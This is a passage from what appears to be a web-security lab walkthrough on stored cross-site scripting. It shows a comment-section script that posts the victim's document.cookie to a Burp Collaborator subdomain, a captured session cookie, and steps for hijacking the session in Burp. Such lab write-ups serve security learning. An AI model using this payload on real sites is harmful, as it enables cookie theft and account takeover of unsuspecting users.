now we will use the payload in the comment section

```js
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

we will use burp collaborator to generate a subdomain

session cookie value `7DHUIVGKgP42W5BFRsSqnjYOq5NlWZ6u`

Lets copy the session value and and go to the web browser and turn on burp intercept and then click on my account.

change cookie value with the session cookie that we have.
